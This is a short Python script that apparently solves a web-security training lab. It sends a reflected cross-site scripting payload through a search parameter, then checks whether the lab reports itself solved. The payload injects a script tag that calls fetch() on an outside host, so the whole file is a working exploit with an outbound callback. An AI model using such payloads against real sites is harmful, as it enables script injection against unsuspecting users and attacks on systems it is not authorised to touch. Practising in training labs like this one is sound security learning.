import requests
from urllib.parse import quote
base_url = 'https://0aa4002104b02ebd82794c3900e80062.web-security-academy.net/'
payload = '"><script>fetch("https://cowboy.rocks/xss/target/1")</script>'
url = f"{base_url}?search={quote(payload)}"
print(url)
response = requests.get(url)
print((response.status_code, len(response.text)))
# Optionally check for lab-solved banner
if 'is-solved' in response.text or 'Solved' in response.text:
    print("[+] Lab appears to be solved!")
else:
    print("[-] Lab not solved yet.")
